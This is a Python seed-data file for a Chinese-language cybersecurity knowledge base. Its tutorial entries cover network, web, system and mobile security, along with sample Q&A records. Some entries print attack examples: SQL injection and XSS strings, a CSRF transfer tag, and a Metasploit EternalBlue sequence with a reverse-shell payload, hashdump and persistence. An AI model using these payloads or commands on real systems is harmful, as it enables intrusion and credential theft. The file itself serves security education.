"""
网络安全领域示例知识数据
用于测试和初始化知识库
"""
from datetime import datetime

# 网络安全领域分类
CATEGORIES = [
    {"id": 1, "name": "网络安全基础", "description": "网络基本原理和安全概念", "icon": "Connection", "sort_order": 1},
    {"id": 2, "name": "Web安全", "description": "Web应用漏洞与防护", "icon": "Monitor", "sort_order": 2},
    {"id": 3, "name": "系统安全", "description": "操作系统安全加固", "icon": "Desktop", "sort_order": 3},
    {"id": 4, "name": "密码学", "description": "加密算法与安全协议", "icon": "Key", "sort_order": 4},
    {"id": 5, "name": "渗透测试", "description": "渗透测试方法与工具", "icon": "Aim", "sort_order": 5},
    {"id": 6, "name": "应急响应", "description": "安全事件响应取证", "icon": "Warning", "sort_order": 6},
    {"id": 7, "name": "数据安全", "description": "数据保护隐私合规", "icon": "Folder", "sort_order": 7},
    {"id": 8, "name": "移动安全", "description": "移动应用设备安全", "icon": "Mobile", "sort_order": 8},
]

# 示例知识条目
SAMPLE_KNOWLEDGE_ITEMS = [
    # ========== 网络安全基础 ==========
    {
        "title": "TCP/IP协议族安全概述",
        "content": """TCP/IP协议族是互联网的基础协议，但存在多种安全威胁。

## 主要安全问题

### 1. ARP欺骗
ARP协议没有认证机制，攻击者可以发送伪造的ARP响应包，将自己的MAC地址绑定到受害者的IP地址，从而实现中间人攻击。

### 2. DNS劫持
DNS查询缺乏验证，攻击者可以篡改DNS缓存或拦截DNS请求，将用户重定向到恶意站点。

### 3. IP欺骗
攻击者可以伪造源IP地址，绕过基于IP的访问控制或发起SYN Flood攻击。

## 防护措施

1. 使用ARP防火墙
2. 部署DNSSEC
3. 启用IPsec加密通信
4. 配置ACL访问控制列表""",
        "category_id": 1,
        "difficulty": "easy",
        "source": "网络安全基础教程",
        "tags": ["TCP/IP", "ARP", "DNS", "协议安全"]
    },
    {
        "title": "防火墙技术原理与分类",
        "content": """防火墙是网络安全的核心设备，用于控制进出网络的流量。

## 防火墙类型

### 1. 包过滤防火墙
工作在网络层，根据源/目标IP地址、端口号、协议类型等过滤数据包。
- 优点：速度快，开销小
- 缺点：无法检查应用层数据

### 2. 状态检测防火墙
跟踪连接状态表，根据连接状态动态调整规则。
- 优点：安全性更高，性能良好
- 缺点：配置复杂

### 3. 应用层防火墙（代理防火墙）
工作在应用层，代理内部网络对外部的访问。
- 优点：完全隔离内外网络，检查应用层数据
- 缺点：速度较慢

## 防火墙部署策略
1. 最小权限原则
2. 默认拒绝策略
3. 纵深防御""",
        "category_id": 1,
        "difficulty": "easy",
        "source": "网络安全基础教程",
        "tags": ["防火墙", "网络安全设备", "访问控制"]
    },

    # ========== Web安全 ==========
    {
        "title": "SQL注入攻击原理与防御",
        "content": """SQL注入是一种将恶意SQL代码插入到应用程序查询中的攻击技术。

## 攻击原理

当应用程序将用户输入直接拼接到SQL查询中时，攻击者可以通过构造特殊输入来：
1. 绕过身份验证
2. 获取数据库中的敏感数据
3. 修改或删除数据
4. 执行系统命令（在某些条件下）

## 经典注入示例

### 绕过登录
```sql
' OR '1'='1' --
```
这条输入使WHERE条件永远为真。

### 联合查询注入
```sql
' UNION SELECT username, password FROM users --
```
用于获取其他表的数据。

## 防御措施

1. **参数化查询**：使用预编译语句
2. **输入验证**：白名单验证用户输入
3. **转义特殊字符**：对引号等进行转义
4. **最小权限原则**：数据库账户不要用DBA权限
5. **使用WAF**：Web应用防火墙""",
        "category_id": 2,
        "difficulty": "medium",
        "source": "Web安全实战指南",
        "tags": ["SQL注入", "OWASP", "Web漏洞", "数据库安全"]
    },
    {
        "title": "XSS跨站脚本攻击详解",
        "content": """XSS（Cross-Site Scripting）攻击允许攻击者在受害者的浏览器中执行恶意脚本。

## XSS类型

### 1. 反射型XSS
恶意脚本作为用户请求的一部分，服务器立即返回这个脚本。
```
http://example.com/search?q=<script>alert('XSS')</script>
```

### 2. 存储型XSS
恶意脚本被永久存储在目标服务器（如数据库）中。
常见于评论区、论坛帖子等用户生成内容。

### 3. DOM型XSS
攻击payload在客户端通过JavaScript动态生成，不经过服务器。

## 危害
- 窃取Cookie/Session
- 键盘记录
- 修改页面内容
- 蠕虫传播

## 防御措施
1. 输入过滤和验证
2. 输出编码（HTML转义）
3. HttpOnly标记Cookie
4. Content Security Policy (CSP)""",
        "category_id": 2,
        "difficulty": "medium",
        "source": "Web安全实战指南",
        "tags": ["XSS", "跨站脚本", "Web漏洞", "前端安全"]
    },
    {
        "title": "CSRF跨站请求伪造",
        "content": """CSRF（Cross-Site Request Forgery）是一种利用用户已登录的身份发起非预期请求的攻击。

## 攻击原理

1. 用户登录网站A并获取有效Session
2. 攻击者诱使用户访问恶意网站B
3. 网站B中包含向网站A发起请求的代码
4. 浏览器自动携带Cookie发送请求

## 攻击示例
```html
<img src="http://bank.com/transfer?to=attacker&amount=10000">
```

## 防御措施

### 1. CSRF Token
在表单中添加随机生成的Token，服务器验证其有效性。

### 2. 双重Cookie验证
将Token同时放在Cookie和参数中，服务器比较两者。

### 3. 验证Referer/Origin
检查请求的来源页面。

### 4.  SameSite Cookie
设置Cookie的SameSite属性，限制跨站请求。""",
        "category_id": 2,
        "difficulty": "medium",
        "source": "Web安全实战指南",
        "tags": ["CSRF", "会话安全", "Web漏洞"]
    },

    # ========== 系统安全 ==========
    {
        "title": "Linux系统安全加固指南",
        "content": """Linux系统安全加固是保护服务器安全的重要措施。

## 账户安全

### 1. 密码策略
- 设置强密码（包含大小写字母、数字、特殊字符）
- 定期更换密码
- 使用PAM模块强化密码策略

### 2. 账户管理
```bash
# 禁用不需要的系统账户
usermod -s /sbin/nologin apache
# 锁定账户
passwd -l guest
# 检查空密码账户
awk -F: '($2 == "") {print}' /etc/shadow
```

## 文件权限

### 1. 最小权限原则
```bash
chmod 640 /etc/shadow
chmod 755 /bin
```

### 2. SUID/SGID检查
```bash
find / -perm -4000 -o -perm -2000 2>/dev/null
```

## 服务安全

1. 禁用不必要的服务
2. 关闭危险的端口
3. 配置iptables/firewalld
4. 启用审计日志

## 补丁管理
定期更新系统和软件补丁""",
        "category_id": 3,
        "difficulty": "hard",
        "source": "系统安全加固手册",
        "tags": ["Linux", "系统加固", "账户安全", "权限管理"]
    },
    {
        "title": "Windows系统安全策略配置",
        "content": """Windows系统安全策略是保护Windows服务器和工作站的关键。

## 账户策略

### 密码策略
- 最小密码长度：12位
- 密码复杂性要求：启用
- 密码最长使用期：90天
- 强制密码历史：5个

### 账户锁定策略
- 账户锁定阈值：5次无效登录
- 锁定持续时间：30分钟

## 用户权限分配

通过本地安全策略配置用户权限：
- 关闭系统：不授予普通用户
- 远程关机：仅管理员
- 取得文件所有权：仅管理员

## 安全选项

1. 启用UAC（用户账户控制）
2. 禁用administrator账户
3. 开启审核策略
4. 配置网络安全防火墙

## 端口和服务管理
使用IIS管理器和服务管理器禁用不必要的服务和端口。""",
        "category_id": 3,
        "difficulty": "medium",
        "source": "系统安全加固手册",
        "tags": ["Windows", "安全策略", "域安全"]
    },

    # ========== 密码学 ==========
    {
        "title": "对称加密与非对称加密对比",
        "content": """密码学是网络安全的基石，主要分为对称加密和非对称加密。

## 对称加密

### 原理
加密和解密使用相同的密钥。

### 常用算法
- **AES**：高级加密标准，密钥长度128/192/256位
- **DES**：数据加密标准，已不安全
- **3DES**：三重DES，兼容但慢
- **ChaCha20**：流密码，用于移动设备

### 优点
速度快，适合大数据加密

### 缺点
密钥分发困难

## 非对称加密

### 原理
使用公钥加密，私钥解密。

### 常用算法
- **RSA**：基于大数分解难题，2048位以上安全
- **ECC**：椭圆曲线密码学，同等安全性密钥更短
- **DH**：Diffie-Hellman，密钥交换

### 优点
密钥分发简单，支持数字签名

### 缺点
速度慢，约为对称加密的1000倍

## 混合加密实践
实际应用中通常结合两者：
1. 用非对称加密传递对称密钥
2. 用对称加密加密实际数据""",
        "category_id": 4,
        "difficulty": "medium",
        "source": "密码学导论",
        "tags": ["加密算法", "AES", "RSA", "密码学基础"]
    },
    {
        "title": "数字签名与数字证书",
        "content": """数字签名和数字证书是实现身份认证和数据完整性保护的核心技术。

## 数字签名

### 工作原理
1. 对消息进行Hash运算
2. 用私钥对Hash值加密
3. 发送原文和加密的Hash值
4. 接收方用公钥解密Hash值
5. 接收方对原文计算Hash对比

### 作用
- 确认发送者身份（不可抵赖）
- 确认消息完整性
- 不能保护机密性

## 数字证书

### X.509证书结构
```
证书版本号、序列号
签名算法
颁发者信息
有效期
主体信息（公钥）
颁发者唯一标识符
主体唯一标识符
扩展信息
签名
```

### PKI体系
- **CA**：证书颁发机构
- **RA**：证书注册机构
- **CRL**：证书吊销列表
- **OCSP**：在线证书状态协议

### 证书类型
1. 根证书：CA自签名
2. 中间证书：CA下级颁发
3. 服务器证书：域名验证
4. 客户端证书：用户身份验证""",
        "category_id": 4,
        "difficulty": "hard",
        "source": "密码学导论",
        "tags": ["数字签名", "数字证书", "PKI", "身份认证"]
    },

    # ========== 渗透测试 ==========
    {
        "title": "信息收集与侦察技术",
        "content": """渗透测试的第一步是信息收集，这决定了后续攻击的方向。

## 被动信息收集

### 1. WHOIS查询
```bash
whois example.com
```
获取域名注册信息、DNS服务器等。

### 2. DNS收集
```bash
# 子域名枚举
dnsenum example.com
# DNS区域传送
dig axfr @ns.example.com example.com
```

### 3. 搜索引擎
- Google Hacking：`site:example.com filetype:pdf`
- shodan.io：搜索互联网设备
- censys.io：搜索证书和SSL配置

## 主动信息收集

### 1. 端口扫描
```bash
# SYN扫描
nmap -sS -p- 192.168.1.1
# 服务版本检测
nmap -sV -p 80,443 192.168.1.1
# 操作系统检测
nmap -O 192.168.1.1
```

### 2. 漏洞扫描
```bash
# 使用Nessus或OpenVAS
```

### 3. 社会工程学
通过钓鱼邮件、电话等方式收集信息。

## 收集的信息类型
- 域名和子域名
- IP地址范围
- 开放端口和服务
- 员工信息和邮箱
- 技术架构""",
        "category_id": 5,
        "difficulty": "medium",
        "source": "渗透测试实战指南",
        "tags": ["信息收集", "nmap", "侦察", "渗透测试"]
    },
    {
        "title": "Metasploit渗透测试框架使用",
        "content": """Metasploit是世界上最流行的渗透测试框架。

## 架构

### 模块类型
- **Exploit**：漏洞利用模块
- **Payload**：攻击载荷
- **Auxiliary**：辅助模块（扫描、嗅探）
- **Encoder**：编码器模块
- **Post**：后渗透模块

## 基本使用

### 1. 启动msfconsole
```bash
msfconsole
```

### 2. 搜索模块
```bash
search type:exploit name:smb
```

### 3. 使用模块
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### 4. Meterpreter后渗透
```bash
# 获取系统信息
sysinfo
# 获取密码哈希
hashdump
# 端口转发
portfwd add -l 3389 -p 3389 -r 192.168.1.100
# 持久化
run persistence -X -i 10 -p 4444 -r 192.168.1.50
```

## 常用漏洞模块
- MS17-010（永恒之蓝）
- CVE-2019-0708（RDP漏洞）
- WebLogic反序列化""",
        "category_id": 5,
        "difficulty": "hard",
        "source": "渗透测试实战指南",
        "tags": ["Metasploit", "渗透框架", "漏洞利用", "Meterpreter"]
    },

    # ========== 应急响应 ==========
    {
        "title": "安全事件分类与分级标准",
        "content": """安全事件分类分级是应急响应的重要基础。

## 事件分类（按类型）

### 1. 恶意代码事件
- 计算机病毒
- 蠕虫病毒
- 木马程序
- 勒索软件
-挖矿程序

### 2. 信息破坏事件
- 网络攻击导致数据篡改
- 数据泄露
- 数据窃取

### 3. 网络攻击事件
- DDoS攻击
- APT攻击
- 钓鱼攻击
- 零日攻击

### 4. 系统入侵事件
- 非授权访问
- 账号破解
- 权限提升

## 事件分级（按影响）

### 特别重大事件（I级）
- 全国性关键基础设施瘫痪
- 造成重大经济损失
- 影响国家安全

### 重大事件（II级）
- 多个省份受影响
- 造成较大经济损失
- 影响社会稳定

### 较大事件（III级）
- 单个省份受影响
- 造成一定经济损失
- 部门正常工作受影响

### 一般事件（IV级）
- 局部影响
- 轻微经济损失
- 可快速恢复""",
        "category_id": 6,
        "difficulty": "easy",
        "source": "应急响应手册",
        "tags": ["事件分类", "事件分级", "应急响应"]
    },
    {
        "title": "数字取证与溯源技术",
        "content": """数字取证是应急响应的核心环节，用于收集证据和确定攻击来源。

## 取证原则

### 1. 合法性
取证过程必须合法合规，避免证据失效。

### 2. 完整性
保证证据不被篡改，使用哈希校验。

### 3. 可追溯性
记录取证全流程，可重现。

## 主机取证

### 内存取证
```bash
# 获取内存镜像
sudo dd if=/dev/mem of=memory.img
# 使用Volatility分析
volatility -f memory.img pslist
```

### 硬盘取证
```bash
# 创建磁盘镜像
dd if=/dev/sda of=disk.img conv=sync,noerror
# 计算哈希
sha256sum disk.img
```

### 日志分析
- 系统日志：/var/log/*
- 应用日志：Nginx、Apache、MySQL等
- 安全日志：/var/log/secure

## 网络取证

### 流量分析
```bash
# 抓包分析
tcpdump -i eth0 -w capture.pcap
# 使用Wireshark分析
```

### 溯源方法
1. IP追踪：WHOIS、路由追踪
2. 日志分析：关联分析
3. 蜜罐诱捕：部署陷阱""",
        "category_id": 6,
        "difficulty": "hard",
        "source": "应急响应手册",
        "tags": ["数字取证", "溯源", "日志分析", "应急响应"]
    },

    # ========== 数据安全 ==========
    {
        "title": "数据加密存储最佳实践",
        "content": """数据加密存储是保护敏感数据的核心措施。

## 加密策略

### 1. 透明数据加密（TDE）
数据库级别的加密，整个数据库文件加密。
- MySQL: InnoDB表空间加密
- SQL Server: TDE功能

### 2. 列级加密
对敏感列（如身份证号、银行卡号）单独加密。
```sql
-- MySQL AES加密示例
INSERT INTO users (ssn) VALUES (AES_ENCRYPT('123456789', 'key'));
SELECT AES_DECRYPT(ssn, 'key') FROM users;
```

### 3. 应用层加密
在应用程序中完成加密，数据库只存储密文。

## 密钥管理

### 原则
1. 密钥与数据分离
2. 使用硬件安全模块（HSM）
3. 密钥定期轮换

### 密钥分层
- 主密钥：保护密钥加密密钥
- 密钥加密密钥（KEK）：加密数据密钥
- 数据密钥（DEK）：加密实际数据

## 敏感数据处理
- 脱敏：对非生产环境数据进行处理
- 掩码：显示部分信息如****1234
- 分片：敏感数据分散存储""",
        "category_id": 7,
        "difficulty": "medium",
        "source": "数据安全实践指南",
        "tags": ["数据加密", "密钥管理", "TDE", "敏感数据"]
    },
    {
        "title": "GDPR与个人信息保护合规",
        "content": """GDPR（通用数据保护条例）是欧盟制定的数据保护法规。

## 核心原则

### 1. 合法性、公平性和透明性
数据处理必须有合法依据。

### 2. 目的限制
数据只能用于明确声明的目的。

### 3. 数据最小化
只收集必要的数据。

### 4. 准确性
保持数据准确及时更新。

### 5. 存储限制
不超过必要时间存储。

### 6. 完整性和机密性
采取适当安全措施保护数据。

## 数据主体权利

1. **知情权**：了解数据如何被处理
2. **访问权**：获取个人数据副本
3. **更正权**：修正不准确的数据
4. **删除权**：要求删除数据（被遗忘权）
5. **限制处理权**：限制某些处理活动
6. **数据可携权**：获取结构化格式的数据
7. **拒绝权**：拒绝直接营销

## 合规要求

### 技术措施
- 数据加密
- 访问控制
- 审计日志
- 数据脱敏

### 管理措施
- 隐私影响评估
- 数据保护官（DPO）
- 数据泄露通知机制""",
        "category_id": 7,
        "difficulty": "medium",
        "source": "数据安全实践指南",
        "tags": ["GDPR", "隐私保护", "合规", "个人信息"]
    },

    # ========== 移动安全 ==========
    {
        "title": "Android应用安全测试方法",
        "content": """Android应用安全测试是移动安全的重要组成部分。

## 测试环境搭建

### 工具准备
- Android Studio
- Jadx（反编译）
- Frida（动态插桩）
- Burp Suite（抓包代理）

### root检测与绕过
```javascript
// Frida绕过root检测
Java.perform(function() {
    var RootPackages = ["com.topjohnwu.magisk"];
    var PackageManager = Java.use("android.content.pm.PackageManager");
    // 检测逻辑绕过
});
```

## 静态分析

### 反编译APK
```bash
# 使用apktool
apktool d app.apk -o output
# 使用jadx
jadx -d output app.apk
```

### 检查项
1. 硬编码密钥/密码
2. 不安全的存储（SharedPreferences）
3. 调试标志未关闭
4. 混淆不足

## 动态分析

### 网络流量抓包
1. 配置Burp Suite代理
2. 安装CA证书到设备
3. 抓取HTTP/HTTPS流量

### 运行时分析
```bash
# 使用Frida连接进程
frida -U -f com.example.app -l script.js
```

## 常见漏洞
- 不安全的数据存储
- 不安全的通信
- 弱加密
- 客户端注入
- 业务逻辑漏洞""",
        "category_id": 8,
        "difficulty": "hard",
        "source": "移动安全测试指南",
        "tags": ["Android", "移动安全", "逆向工程", "Frida"]
    },
    {
        "title": "iOS应用安全机制与测试",
        "content": """iOS应用因其封闭性，在安全方面有其独特机制。

## iOS安全机制

### 1. 应用签名
所有应用必须经过Apple签名验证。
- 开发者签名：测试用
- 企业签名：企业内部分发
- App Store签名：正式发布

### 2. Sandbox沙盒
每个应用运行在独立沙盒中，无法访问其他应用数据。

### 3. 数据保护
- NSFileProtectionComplete：设备解锁才可访问
- Keychain：加密存储敏感数据

### 4. ATS应用传输安全
强制HTTPS连接，拒绝不安全的HTTP。

## 安全测试

### 工具
- Hopper Disassembler：反汇编
- Radare2：逆向分析
- Charles：抓包代理

### 测试方法

#### 1. IPA分析
```bash
# 提取可执行文件
unzip -o app.ipa
# 复制二进制文件进行逆向
```

#### 2. 敏感数据检测
- 检查NSLog输出
- 检查日志文件
- 检查Keychain使用

#### 3. 网络安全
- 绕过ATS验证
- 中间人攻击测试
- 证书校验绕过

## 加固建议
1. 使用SSL Pinning
2. 敏感数据存储在Keychain
3. 关闭调试日志
4. 代码混淆""",
        "category_id": 8,
        "difficulty": "hard",
        "source": "移动安全测试指南",
        "tags": ["iOS", "移动安全", "逆向工程", "IPA"]
    },
]


# 示例问答记录
SAMPLE_QA_RECORDS = [
    {
        "question": "什么是SQL注入？如何防御？",
        "answer": """SQL注入是一种将恶意SQL代码插入到应用程序查询中的攻击技术。

## 攻击原理

当应用程序将用户输入直接拼接到SQL查询中时，攻击者可以通过构造特殊输入来：
1. 绕过身份验证
2. 获取数据库中的敏感数据
3. 修改或删除数据

## 经典示例
```sql
' OR '1'='1' --
```

## 防御措施

1. **参数化查询**：使用预编译语句
2. **输入验证**：白名单验证用户输入
3. **转义特殊字符**
4. **最小权限原则**
5. **使用WAF**""",
        "feedback": "good"
    },
    {
        "question": "XSS和CSRF有什么区别？",
        "answer": """XSS和CSRF都是Web安全中常见的攻击方式，但原理不同：

## XSS（跨站脚本攻击）
- 在页面中执行恶意JavaScript脚本
- 攻击目标是用户的浏览器
- 可以窃取Cookie、劫持会话

## CSRF（跨站请求伪造）
- 伪造用户发起恶意请求
- 攻击目标是服务器
- 利用用户已登录的状态执行操作

## 主要区别

| 方面 | XSS | CSRF |
|------|-----|------|
| 攻击位置 | 客户端 | 服务器 |
| 本质 | 执行脚本 | 伪造请求 |
| 防护 | 输入输出编码 | CSRF Token |
| 影响 | 窃取数据、蠕虫 | 执行操作 |""",
        "feedback": "good"
    },
]


def get_sample_data():
    """获取所有示例数据"""
    return {
        "categories": CATEGORIES,
        "knowledge_items": SAMPLE_KNOWLEDGE_ITEMS,
        "qa_records": SAMPLE_QA_RECORDS
    }


def get_knowledge_by_category(category_id):
    """按分类获取知识"""
    return [k for k in SAMPLE_KNOWLEDGE_ITEMS if k["category_id"] == category_id]


def get_knowledge_by_tag(tag):
    """按标签获取知识"""
    return [k for k in SAMPLE_KNOWLEDGE_ITEMS if tag in k.get("tags", [])]